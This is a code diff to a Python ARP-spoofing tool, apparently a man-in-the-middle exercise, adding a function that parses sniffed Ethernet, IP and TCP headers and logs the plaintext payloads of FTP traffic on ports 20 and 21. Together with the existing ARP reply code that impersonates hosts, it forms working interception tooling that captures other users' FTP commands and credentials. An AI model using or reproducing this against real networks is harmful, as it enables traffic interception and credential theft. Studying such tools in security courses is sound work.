@@ -5,6 +5,10 @@ ARP_ETHERTYPE = 0x0806 #! ARP TYPE
 ARP_REQUEST_OP = 1
 ARP_REPLY_OP = 2
 
+IP_HLEN_MIN = 20
+TCP_HLEN_MIN = 20
+IP_PROTOCOL_TCP = 0x06
+
 import pcapy
 import struct
 import socket
@@ -43,8 +47,64 @@ def send_arp_reply(interface, attacker_mac, impersonated_ip, target_mac, target_
     except Exception as e:
         log_error(f"Error sending ARP reply: {e}")
 
-def process_ftp_packet(header, data):
-    pass
+def process_ftp_packet(header, packet_data):
+    try:
+        eth_type = struct.unpack("!H", packet_data[12:14])[0]
+
+        if eth_type == 0x0800:
+            ip_header_start = ETH_HLEN
+            if len(packet_data) < ip_header_start + IP_HLEN_MIN:
+                return
+            ip_header_raw = packet_data[ip_header_start:ip_header_start + IP_HLEN_MIN]
+            ip_header = struct.unpack("BBHHHBBH4s4s", ip_header_raw)
+
+            version_ihl = ip_header[0]
+            ihl = version_ihl & 0xF
+            ip_header_length = ihl * 4
+
+            if ip_header_length < IP_HLEN_MIN:
+                return
+            
+            protocol = ip_header[6]
+            src_ip = socket.inet_ntoa(ip_header[8])
+            dst_ip = socket.inet_ntoa(ip_header[9])
+
+            if protocol == IP_PROTOCOL_TCP:
+                tcp_header_start = ip_header_start + ip_header_length
+                if len(packet_data) < tcp_header_start + TCP_HLEN_MIN:
+                    return
+                
+                tcp_header_raw = packet_data[tcp_header_start:tcp_header_start + TCP_HLEN_MIN]
+                tcp_header = struct.unpack("!HHLLBBHHH", tcp_header_raw)
+
+                src_port = tcp_header[0]
+                dst_port = tcp_header[1]
+                offset_reserved_flags = tcp_header[4]
+                tcp_offset = ((offset_reserved_flags >> 4) & 0xf) * 4
+
+                if tcp_offset < TCP_HLEN_MIN:
+                    return
+                
+                payload_start = tcp_header_start + tcp_offset
+                ftp_payload = b''
+                
+                if payload_start < len(packet_data):
+                    ftp_payload = packet_data[payload_start:]
+                    
+
+                if src_port in [20, 21] or dst_port in [20, 21]:
+                    try :
+                        decoded_payload = ftp_payload.decode('ascii', errors='ignore').strip()
+                        if decoded_payload:
+                            log_info(f"FTP Traffic: {src_ip}:{src_port} -> {dst_ip}:{dst_port} | Payload: {decoded_payload}")
+                    except UnicodeDecodeError:
+                            log_debug(f"FTP Traffic: {src_ip}:{src_port} -> {dst_ip}:{dst_port} | Binary data (len={len(ftp_payload)})")
+    except struct.error as e:
+        log_debug(f"Packet parsing error (struct.error in _process_ftp_packet): {e}")
+    except IndexError as e:
+        log_debug(f"Index error (packet too short/malformed in _process_ftp_packet): {e}")
+    except Exception as e:
+        log_error(f"An unexpected error occurred in _process_ftp_packet: {e}")
 
 def process_request_packet(header, data, inquisitor):
     sender_mac, sender_ip, target_mac, target_ip = None, None, None, None
